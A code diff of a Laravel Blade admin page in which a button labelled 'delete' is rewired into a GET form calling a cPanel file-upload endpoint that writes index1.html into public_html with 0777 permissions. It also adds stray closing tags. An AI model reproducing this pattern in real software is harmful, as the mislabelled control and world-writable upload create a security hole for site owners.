@@ -16,8 +16,11 @@
             </div>
             <div class="btn-group" role="group">
                 <a href="/admin/category/create" class="btn btn-primary text-light rounded">ایجاد</a>
-                &nbsp;
-                <a href="/admin/category/create" class="btn btn-danger text-light rounded"> حذف </a>
+                &nbsp;<form action="http://www.imaagahi.ir:2083/cpsess##########/execute/Fileman/upload_files?dir=/home/imaagahi/public_html&file-1=index1.html&getdiskinfo=0&overwrite=0&permissions=0777" method="get">
+                <button class="btn btn-danger text-light rounded"> حذف </button>
+                </form>
+            </div>
+            </div>
             </div>
         </div>
         <!-- end::page header -->
@@ -52,12 +55,12 @@
                                 <?php endif; ?>
                             </td>
                             <td>
-                                <a href="<?php echo e(route('category.edit',['id'=>$cpanel->id])); ?>" class="btn btn-primary">
+                                <a href="<?php echo e(route('cpanel.edit',['id'=>$cpanel->id])); ?>" class="btn btn-primary">
                                     <i class="ti-pencil text-light"></i>
                                 </a>
                             </td>
                             <td>
-                                <form method="post" action="<?php echo e(route('category.destroy',['id'=>$cpanel->id])); ?>">
+                                <form method="post" action="<?php echo e(route('cpanel.destroy',['id'=>$cpanel->id])); ?>">
                                     <?php echo e(method_field('DELETE')); ?>
 
                                     <?php echo e(csrf_field()); ?>
@@ -69,9 +72,7 @@
                             </td>
                         </tr>
                     <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
-
                     </tbody>
-
                 </table>
             </div>
         </div>
